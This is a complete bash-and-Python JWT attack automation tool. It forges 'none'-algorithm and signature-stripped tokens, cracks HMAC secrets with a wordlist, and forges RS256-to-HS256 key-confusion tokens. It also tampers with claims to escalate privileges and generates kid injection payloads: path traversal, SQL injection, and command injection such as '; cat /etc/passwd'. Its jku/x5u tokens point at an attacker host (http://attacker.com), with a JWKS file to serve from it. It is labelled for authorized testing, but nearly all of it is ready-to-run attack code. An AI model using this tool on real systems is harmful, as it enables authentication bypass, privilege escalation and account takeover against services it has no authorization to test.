#!/bin/bash
#
# JWT Attack Automation Script
# For authorized security testing only
#
# Usage:
#   ./jwt-attacks.sh <token> [options]
#   ./jwt-attacks.sh eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... --all
#   ./jwt-attacks.sh eyJ... --crack /path/to/wordlist.txt
#   ./jwt-attacks.sh eyJ... --none-alg
#

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Configuration
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
OUTPUT_DIR="${SCRIPT_DIR}/jwt_output_$(date +%Y%m%d_%H%M%S)"
JWT_TOOL_PATH="jwt_tool"
WORDLIST_DEFAULT="/usr/share/wordlists/rockyou.txt"

# Banner
banner() {
    echo -e "${CYAN}"
    echo "================================================"
    echo "       JWT Attack Automation Framework"
    echo "       For Authorized Testing Only"
    echo "================================================"
    echo -e "${NC}"
}

# Logging functions
log_info() {
    echo -e "${BLUE}[*]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[+]${NC} $1"
}

log_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

log_error() {
    echo -e "${RED}[-]${NC} $1"
}

# Check dependencies
check_deps() {
    local deps_missing=0

    if ! command -v python3 &> /dev/null; then
        log_error "python3 not found"
        deps_missing=1
    fi

    if ! command -v $JWT_TOOL_PATH &> /dev/null && ! command -v python3 -m jwt_tool &> /dev/null; then
        log_warning "jwt_tool not found - some attacks may fail"
        log_info "Install: pip3 install jwt-tool OR git clone https://github.com/ticarpi/jwt_tool"
    fi

    if ! command -v jq &> /dev/null; then
        log_warning "jq not found - install for better JSON parsing"
    fi

    return $deps_missing
}

# Base64 URL decode (POSIX compatible)
b64url_decode() {
    local input="$1"
    # Replace URL-safe chars and add padding
    local padded=$(echo "$input" | tr '_-' '/+')
    local mod=$((${#padded} % 4))
    if [ $mod -eq 2 ]; then
        padded="${padded}=="
    elif [ $mod -eq 3 ]; then
        padded="${padded}="
    fi
    echo "$padded" | base64 -d 2>/dev/null
}

# Base64 URL encode
b64url_encode() {
    base64 | tr '+/' '-_' | tr -d '='
}

# Decode and display JWT
decode_jwt() {
    local token="$1"

    log_info "Decoding JWT..."
    echo ""

    # Split token
    IFS='.' read -ra PARTS <<< "$token"

    if [ ${#PARTS[@]} -ne 3 ]; then
        log_error "Invalid JWT format (expected 3 parts, got ${#PARTS[@]})"
        return 1
    fi

    HEADER=$(b64url_decode "${PARTS[0]}")
    PAYLOAD=$(b64url_decode "${PARTS[1]}")
    SIGNATURE="${PARTS[2]}"

    echo -e "${CYAN}=== JWT Header ===${NC}"
    if command -v jq &> /dev/null; then
        echo "$HEADER" | jq .
    else
        echo "$HEADER"
    fi
    echo ""

    echo -e "${CYAN}=== JWT Payload ===${NC}"
    if command -v jq &> /dev/null; then
        echo "$PAYLOAD" | jq .
    else
        echo "$PAYLOAD"
    fi
    echo ""

    echo -e "${CYAN}=== JWT Signature ===${NC}"
    echo "$SIGNATURE"
    echo ""

    # Extract algorithm
    ALG=$(echo "$HEADER" | grep -oP '"alg"\s*:\s*"[^"]*"' | cut -d'"' -f4)
    log_info "Algorithm: $ALG"

    # Check expiration
    EXP=$(echo "$PAYLOAD" | grep -oP '"exp"\s*:\s*[0-9]+' | grep -oP '[0-9]+')
    if [ -n "$EXP" ]; then
        CURRENT_TIME=$(date +%s)
        if [ "$EXP" -lt "$CURRENT_TIME" ]; then
            log_warning "Token EXPIRED at $(date -d @$EXP 2>/dev/null || date -r $EXP 2>/dev/null || echo $EXP)"
        else
            log_info "Token expires at $(date -d @$EXP 2>/dev/null || date -r $EXP 2>/dev/null || echo $EXP)"
        fi
    else
        log_warning "No expiration claim (exp) found"
    fi
}

# None algorithm attack
attack_none() {
    local token="$1"

    log_info "Attempting 'none' algorithm attack..."
    mkdir -p "$OUTPUT_DIR"

    # Split token
    IFS='.' read -ra PARTS <<< "$token"
    PAYLOAD="${PARTS[1]}"

    # Generate variants with different 'none' capitalizations
    NONE_VARIANTS=("none" "None" "NONE" "nOnE" "nonE")

    for variant in "${NONE_VARIANTS[@]}"; do
        # Create new header
        NEW_HEADER='{"alg":"'$variant'","typ":"JWT"}'
        NEW_HEADER_B64=$(echo -n "$NEW_HEADER" | b64url_encode)

        # Create token with empty signature
        NEW_TOKEN="${NEW_HEADER_B64}.${PAYLOAD}."

        echo "$NEW_TOKEN" >> "$OUTPUT_DIR/none_attack_tokens.txt"
        log_success "Generated 'alg:$variant' token"
    done

    # Also try without signature at all
    NEW_HEADER='{"alg":"none","typ":"JWT"}'
    NEW_HEADER_B64=$(echo -n "$NEW_HEADER" | b64url_encode)
    echo "${NEW_HEADER_B64}.${PAYLOAD}" >> "$OUTPUT_DIR/none_attack_tokens.txt"

    log_info "Tokens saved to: $OUTPUT_DIR/none_attack_tokens.txt"
    echo ""
    echo -e "${YELLOW}Test these tokens against the target endpoint:${NC}"
    head -3 "$OUTPUT_DIR/none_attack_tokens.txt"
}

# Signature stripping
attack_strip_signature() {
    local token="$1"

    log_info "Attempting signature stripping attack..."
    mkdir -p "$OUTPUT_DIR"

    # Split token
    IFS='.' read -ra PARTS <<< "$token"
    HEADER="${PARTS[0]}"
    PAYLOAD="${PARTS[1]}"

    # Variants to try
    echo "${HEADER}.${PAYLOAD}." >> "$OUTPUT_DIR/stripped_tokens.txt"
    echo "${HEADER}.${PAYLOAD}" >> "$OUTPUT_DIR/stripped_tokens.txt"
    echo "${HEADER}.${PAYLOAD}.AA" >> "$OUTPUT_DIR/stripped_tokens.txt"
    echo "${HEADER}.${PAYLOAD}.AAAA" >> "$OUTPUT_DIR/stripped_tokens.txt"

    log_success "Generated stripped signature tokens"
    log_info "Tokens saved to: $OUTPUT_DIR/stripped_tokens.txt"
}

# Crack weak secret
attack_crack() {
    local token="$1"
    local wordlist="${2:-$WORDLIST_DEFAULT}"

    log_info "Attempting to crack JWT secret..."
    log_info "Wordlist: $wordlist"

    if [ ! -f "$wordlist" ]; then
        log_error "Wordlist not found: $wordlist"
        return 1
    fi

    mkdir -p "$OUTPUT_DIR"

    # Try using jwt_tool if available
    if command -v $JWT_TOOL_PATH &> /dev/null; then
        log_info "Using jwt_tool for cracking..."
        $JWT_TOOL_PATH "$token" -C -d "$wordlist" | tee "$OUTPUT_DIR/crack_results.txt"
        return
    fi

    # Fall back to Python implementation
    log_info "Using Python cracker..."

    python3 << EOF
import sys
import hmac
import hashlib
import base64
import json

def b64url_decode(data):
    padding = 4 - len(data) % 4
    if padding != 4:
        data += '=' * padding
    return base64.urlsafe_b64decode(data)

def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def crack_jwt(token, wordlist_path):
    parts = token.split('.')
    if len(parts) != 3:
        print("[-] Invalid JWT")
        return None

    header_b64 = parts[0]
    payload_b64 = parts[1]
    signature = parts[2]

    header = json.loads(b64url_decode(header_b64))
    alg = header.get('alg', '').upper()

    if alg == 'HS256':
        hash_func = hashlib.sha256
    elif alg == 'HS384':
        hash_func = hashlib.sha384
    elif alg == 'HS512':
        hash_func = hashlib.sha512
    else:
        print(f"[-] Unsupported algorithm for cracking: {alg}")
        return None

    message = f"{header_b64}.{payload_b64}".encode()
    target_sig = b64url_decode(signature)

    print(f"[*] Algorithm: {alg}")
    print(f"[*] Starting crack...")

    tried = 0
    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            secret = line.strip()
            if not secret:
                continue

            sig = hmac.new(secret.encode(), message, hash_func).digest()

            if sig == target_sig:
                print(f"\n[+] SECRET FOUND: {secret}")
                return secret

            tried += 1
            if tried % 100000 == 0:
                print(f"[*] Tried {tried} passwords...")

    print(f"\n[-] Secret not found (tried {tried} passwords)")
    return None

token = "$token"
wordlist = "$wordlist"
crack_jwt(token, wordlist)
EOF
}

# Key confusion attack (RS256 to HS256)
attack_key_confusion() {
    local token="$1"
    local pubkey_file="$2"

    log_info "Attempting algorithm confusion attack (RS256 -> HS256)..."

    if [ -z "$pubkey_file" ]; then
        log_error "Public key file required for key confusion attack"
        log_info "Usage: $0 <token> --key-confusion /path/to/public.pem"
        return 1
    fi

    if [ ! -f "$pubkey_file" ]; then
        log_error "Public key file not found: $pubkey_file"
        return 1
    fi

    mkdir -p "$OUTPUT_DIR"

    # Try using jwt_tool if available
    if command -v $JWT_TOOL_PATH &> /dev/null; then
        log_info "Using jwt_tool for key confusion attack..."
        $JWT_TOOL_PATH "$token" -X k -pk "$pubkey_file" | tee "$OUTPUT_DIR/key_confusion_result.txt"
        return
    fi

    # Fall back to Python
    log_info "Using Python for key confusion..."

    python3 << EOF
import sys
import hmac
import hashlib
import base64
import json

def b64url_decode(data):
    padding = 4 - len(data) % 4
    if padding != 4:
        data += '=' * padding
    return base64.urlsafe_b64decode(data)

def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

token = "$token"
pubkey_file = "$pubkey_file"

parts = token.split('.')
if len(parts) != 3:
    print("[-] Invalid JWT")
    sys.exit(1)

# Read public key
with open(pubkey_file, 'rb') as f:
    pubkey = f.read()

# Modify header to HS256
header = json.loads(b64url_decode(parts[0]))
original_alg = header.get('alg')
header['alg'] = 'HS256'
new_header_b64 = b64url_encode(json.dumps(header, separators=(',', ':')).encode())

# Create message and sign with public key
message = f"{new_header_b64}.{parts[1]}".encode()
signature = hmac.new(pubkey, message, hashlib.sha256).digest()
new_sig_b64 = b64url_encode(signature)

new_token = f"{new_header_b64}.{parts[1]}.{new_sig_b64}"

print(f"[*] Original algorithm: {original_alg}")
print(f"[*] New algorithm: HS256")
print(f"[+] Forged token:")
print(new_token)

with open("$OUTPUT_DIR/key_confusion_token.txt", 'w') as f:
    f.write(new_token)
print(f"\n[*] Token saved to: $OUTPUT_DIR/key_confusion_token.txt")
EOF
}

# Claim tampering
attack_tamper_claims() {
    local token="$1"
    local secret="${2:-}"

    log_info "Generating tampered claim variations..."
    mkdir -p "$OUTPUT_DIR"

    python3 << EOF
import sys
import hmac
import hashlib
import base64
import json
import time

def b64url_decode(data):
    padding = 4 - len(data) % 4
    if padding != 4:
        data += '=' * padding
    return base64.urlsafe_b64decode(data)

def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def sign_hs256(header_b64, payload_b64, secret):
    message = f"{header_b64}.{payload_b64}".encode()
    signature = hmac.new(secret.encode(), message, hashlib.sha256).digest()
    return b64url_encode(signature)

token = "$token"
secret = "$secret"

parts = token.split('.')
if len(parts) != 3:
    print("[-] Invalid JWT")
    sys.exit(1)

header = json.loads(b64url_decode(parts[0]))
payload = json.loads(b64url_decode(parts[1]))
header_b64 = parts[0]

print(f"[*] Original payload: {json.dumps(payload, indent=2)}")
print(f"\n[*] Generating tampered variations...\n")

tampered_tokens = []

# Common privilege escalation tampering
tampering_rules = [
    ('role', ['admin', 'administrator', 'root', 'superuser']),
    ('admin', [True, 1, 'true', 'yes']),
    ('is_admin', [True, 1, 'true']),
    ('isAdmin', [True, 1, 'true']),
    ('user_type', ['admin', 'administrator']),
    ('userType', ['admin', 'administrator']),
    ('privilege', ['admin', 'high', '9999']),
    ('level', [999, 10, 'admin']),
    ('group', ['admin', 'administrators']),
]

for claim, values in tampering_rules:
    for value in values:
        new_payload = payload.copy()
        new_payload[claim] = value

        new_payload_b64 = b64url_encode(json.dumps(new_payload, separators=(',', ':')).encode())

        if secret:
            sig = sign_hs256(header_b64, new_payload_b64, secret)
            new_token = f"{header_b64}.{new_payload_b64}.{sig}"
            print(f"[+] {claim}={value} (signed)")
        else:
            new_token = f"{header_b64}.{new_payload_b64}.{parts[2]}"
            print(f"[*] {claim}={value} (unsigned)")

        tampered_tokens.append((f"{claim}={value}", new_token))

# User ID tampering
if 'sub' in payload:
    for user_id in ['1', '0', 'admin', payload.get('sub', '') + '1']:
        new_payload = payload.copy()
        new_payload['sub'] = user_id
        new_payload_b64 = b64url_encode(json.dumps(new_payload, separators=(',', ':')).encode())

        if secret:
            sig = sign_hs256(header_b64, new_payload_b64, secret)
            new_token = f"{header_b64}.{new_payload_b64}.{sig}"
        else:
            new_token = f"{header_b64}.{new_payload_b64}.{parts[2]}"

        tampered_tokens.append((f"sub={user_id}", new_token))

# Expiration tampering
new_payload = payload.copy()
new_payload['exp'] = int(time.time()) + 31536000  # 1 year
new_payload_b64 = b64url_encode(json.dumps(new_payload, separators=(',', ':')).encode())
if secret:
    sig = sign_hs256(header_b64, new_payload_b64, secret)
    new_token = f"{header_b64}.{new_payload_b64}.{sig}"
else:
    new_token = f"{header_b64}.{new_payload_b64}.{parts[2]}"
tampered_tokens.append(("exp=+1year", new_token))

# Remove exp
new_payload = {k: v for k, v in payload.items() if k != 'exp'}
new_payload_b64 = b64url_encode(json.dumps(new_payload, separators=(',', ':')).encode())
if secret:
    sig = sign_hs256(header_b64, new_payload_b64, secret)
    new_token = f"{header_b64}.{new_payload_b64}.{sig}"
else:
    new_token = f"{header_b64}.{new_payload_b64}.{parts[2]}"
tampered_tokens.append(("exp=removed", new_token))

# Save all tokens
with open("$OUTPUT_DIR/tampered_tokens.txt", 'w') as f:
    for desc, tok in tampered_tokens:
        f.write(f"# {desc}\n{tok}\n\n")

print(f"\n[+] Generated {len(tampered_tokens)} tampered tokens")
print(f"[*] Saved to: $OUTPUT_DIR/tampered_tokens.txt")
EOF
}

# KID injection attacks
attack_kid_injection() {
    local token="$1"

    log_info "Generating KID injection payloads..."
    mkdir -p "$OUTPUT_DIR"

    python3 << EOF
import base64
import json
import hmac
import hashlib

def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def b64url_decode(data):
    padding = 4 - len(data) % 4
    if padding != 4:
        data += '=' * padding
    return base64.urlsafe_b64decode(data)

token = "$token"
parts = token.split('.')

header = json.loads(b64url_decode(parts[0]))
payload = json.loads(b64url_decode(parts[1]))

# KID injection payloads
kid_payloads = [
    # Path traversal to /dev/null (empty key)
    ("../../../../../../dev/null", ""),
    ("../../../../../../../dev/null", ""),
    ("/dev/null", ""),

    # Path traversal to known files
    ("../../../../../../etc/passwd", "root:x:0:0:"),  # Won't work but tests the vector
    ("../../../../../../../etc/hostname", ""),

    # SQL injection
    ("' UNION SELECT 'secret' -- ", "secret"),
    ("\" UNION SELECT \"secret\" -- ", "secret"),
    ("' OR '1'='1", ""),

    # Command injection (if kid is passed to system)
    ("| cat /etc/passwd", ""),
    ("; cat /etc/passwd", ""),
    ("\$(cat /etc/passwd)", ""),
    ("\`cat /etc/passwd\`", ""),
]

print("[*] Generating KID injection tokens...\n")

tokens = []
for kid, secret in kid_payloads:
    new_header = header.copy()
    new_header['kid'] = kid
    new_header['alg'] = 'HS256'

    header_b64 = b64url_encode(json.dumps(new_header, separators=(',', ':')).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(',', ':')).encode())

    message = f"{header_b64}.{payload_b64}".encode()
    signature = hmac.new(secret.encode(), message, hashlib.sha256).digest()
    sig_b64 = b64url_encode(signature)

    new_token = f"{header_b64}.{payload_b64}.{sig_b64}"
    tokens.append((kid, new_token))
    print(f"[+] kid={kid[:40]}...")

with open("$OUTPUT_DIR/kid_injection_tokens.txt", 'w') as f:
    for kid, tok in tokens:
        f.write(f"# kid={kid}\n{tok}\n\n")

print(f"\n[+] Generated {len(tokens)} KID injection tokens")
print(f"[*] Saved to: $OUTPUT_DIR/kid_injection_tokens.txt")
EOF
}

# JKU/X5U injection
attack_jku_injection() {
    local token="$1"
    local attacker_url="${2:-http://attacker.com}"

    log_info "Generating JKU/X5U injection tokens..."
    mkdir -p "$OUTPUT_DIR"

    python3 << EOF
import base64
import json

def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def b64url_decode(data):
    padding = 4 - len(data) % 4
    if padding != 4:
        data += '=' * padding
    return base64.urlsafe_b64decode(data)

token = "$token"
attacker_url = "$attacker_url"

parts = token.split('.')
header = json.loads(b64url_decode(parts[0]))
payload = json.loads(b64url_decode(parts[1]))

# JKU/X5U injection payloads
injection_urls = [
    f"{attacker_url}/jwks.json",
    f"{attacker_url}/.well-known/jwks.json",
    f"{attacker_url}/keys",
    "http://localhost/jwks.json",
    "http://127.0.0.1/jwks.json",
    "file:///etc/passwd",
    "file:///dev/null",
]

print("[*] Generating JKU injection tokens...")
print(f"[*] Attacker URL base: {attacker_url}\n")

tokens = []
for url in injection_urls:
    # JKU injection
    new_header = header.copy()
    new_header['jku'] = url
    header_b64 = b64url_encode(json.dumps(new_header, separators=(',', ':')).encode())
    payload_b64 = parts[1]
    new_token = f"{header_b64}.{payload_b64}.{parts[2]}"
    tokens.append(('jku', url, new_token))
    print(f"[+] jku={url}")

    # X5U injection
    new_header = header.copy()
    new_header['x5u'] = url
    header_b64 = b64url_encode(json.dumps(new_header, separators=(',', ':')).encode())
    new_token = f"{header_b64}.{payload_b64}.{parts[2]}"
    tokens.append(('x5u', url, new_token))

with open("$OUTPUT_DIR/jku_x5u_injection_tokens.txt", 'w') as f:
    for header_type, url, tok in tokens:
        f.write(f"# {header_type}={url}\n{tok}\n\n")

print(f"\n[+] Generated {len(tokens)} injection tokens")
print(f"[*] Saved to: $OUTPUT_DIR/jku_x5u_injection_tokens.txt")

# Generate JWKS file for attacker server
print("\n[*] To complete the attack, host this JWKS on your server:")
print("-----BEGIN JWKS-----")
jwks = {
    "keys": [{
        "kty": "oct",
        "kid": "attacker-key",
        "k": b64url_encode(b"secret"),
        "alg": "HS256"
    }]
}
print(json.dumps(jwks, indent=2))
print("-----END JWKS-----")

with open("$OUTPUT_DIR/attacker_jwks.json", 'w') as f:
    json.dump(jwks, f, indent=2)
print(f"\n[*] JWKS saved to: $OUTPUT_DIR/attacker_jwks.json")
EOF
}

# Run all attacks
run_all_attacks() {
    local token="$1"

    log_info "Running all JWT attacks..."
    echo ""

    decode_jwt "$token"
    echo ""

    attack_none "$token"
    echo ""

    attack_strip_signature "$token"
    echo ""

    attack_tamper_claims "$token"
    echo ""

    attack_kid_injection "$token"
    echo ""

    attack_jku_injection "$token"
    echo ""

    log_success "All attacks completed!"
    log_info "Output directory: $OUTPUT_DIR"
}

# Usage information
usage() {
    echo "Usage: $0 <token> [options]"
    echo ""
    echo "Options:"
    echo "  --decode              Decode and display JWT"
    echo "  --none-alg            Try 'none' algorithm attack"
    echo "  --strip               Try signature stripping"
    echo "  --crack <wordlist>    Crack weak secret"
    echo "  --key-confusion <pk>  RS256->HS256 key confusion (requires public key)"
    echo "  --tamper [secret]     Generate tampered claim tokens"
    echo "  --kid                 Generate KID injection tokens"
    echo "  --jku [url]           Generate JKU/X5U injection tokens"
    echo "  --all                 Run all attacks"
    echo "  -h, --help            Show this help"
    echo ""
    echo "Examples:"
    echo "  $0 eyJ... --decode"
    echo "  $0 eyJ... --crack /usr/share/wordlists/rockyou.txt"
    echo "  $0 eyJ... --key-confusion public.pem"
    echo "  $0 eyJ... --all"
}

# Main
main() {
    banner

    if [ $# -lt 1 ]; then
        usage
        exit 1
    fi

    TOKEN="$1"
    shift

    # Validate token format
    if [[ ! "$TOKEN" =~ ^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*$ ]]; then
        log_error "Invalid JWT format"
        exit 1
    fi

    check_deps

    # Default to decode if no options
    if [ $# -eq 0 ]; then
        decode_jwt "$TOKEN"
        exit 0
    fi

    # Parse options
    while [ $# -gt 0 ]; do
        case "$1" in
            --decode)
                decode_jwt "$TOKEN"
                ;;
            --none-alg)
                attack_none "$TOKEN"
                ;;
            --strip)
                attack_strip_signature "$TOKEN"
                ;;
            --crack)
                shift
                attack_crack "$TOKEN" "${1:-$WORDLIST_DEFAULT}"
                ;;
            --key-confusion)
                shift
                attack_key_confusion "$TOKEN" "$1"
                ;;
            --tamper)
                shift
                attack_tamper_claims "$TOKEN" "${1:-}"
                ;;
            --kid)
                attack_kid_injection "$TOKEN"
                ;;
            --jku)
                shift
                attack_jku_injection "$TOKEN" "${1:-http://attacker.com}"
                ;;
            --all)
                run_all_attacks "$TOKEN"
                ;;
            -h|--help)
                usage
                exit 0
                ;;
            *)
                log_error "Unknown option: $1"
                usage
                exit 1
                ;;
        esac
        shift
    done
}

main "$@"
